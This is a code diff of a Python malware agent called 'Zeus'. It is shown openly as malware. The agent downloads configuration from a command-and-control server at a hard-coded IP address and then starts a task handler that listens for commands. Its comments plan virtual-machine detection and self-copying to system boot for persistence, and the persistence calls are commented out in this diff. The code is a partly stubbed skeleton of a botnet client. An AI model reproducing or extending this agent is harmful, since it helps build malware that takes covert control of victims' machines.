@@ -2,17 +2,19 @@
 
 import requests
 
-from Handlers.BootPersistanceHandler import BootPersistanceHandler
+#from Handlers.BootPersistanceHandler import BootPersistanceHandler
 from Handlers.TaskManagmentHandler import TaskManagmentHandler
 
+global configurations
 configurations = {}
 
 def loadConfigurations(getLocallyAlternative=True):
+    global configurations
+
     # Download configurations from Command & Control server
     didLoadWithSuccess = False
 
-    url = "http://192.168.0.102/control.php?task=getConfigurations&agent=zeus"
-    response = requests.get(url)
+    response = requests.get("http://192.168.0.102/control.php?task=getConfigurations&agent=zeus")
 
     if response.text:
         configurations = response.text
@@ -29,23 +31,30 @@ def loadConfigurations(getLocallyAlternative=True):
     return didLoadWithSuccess
 
 def startAndListen():
-    print("Main programm & code goes here")
+    print("[i] Starts listening to commands")
+    taskMgr = TaskManagmentHandler()
+    taskMgr.startTask()
 
 def authenticateDeviceID():
     print("Authenticate device ID with server")
 
 def main():
-    print("Starting Zeus...")
+    print("[i] Starting Zeus")
 
     # Check if we run in Virtual Machine - Kill if yes
 
     # Check if agents exists on device, if not - immediately copy itself to system boot/run
-    bootHandler = BootPersistanceHandler()
-    bootHandler.addSelfToSystemToBoot() # Ignore if we already exists
+    #bootHandler = BootPersistanceHandler()
+    #bootHandler.addSelfToSystemToBoot() # Ignore if we already exists
 
     didLoadConfSuccfully = loadConfigurations()
     if didLoadConfSuccfully:
         startAndListen()
 
 if __name__ == "__main__":
+    print("[i] - Information")
+    print("[e] - Error")
+    print("[l] - Logging")
+    print("")
+
     main()
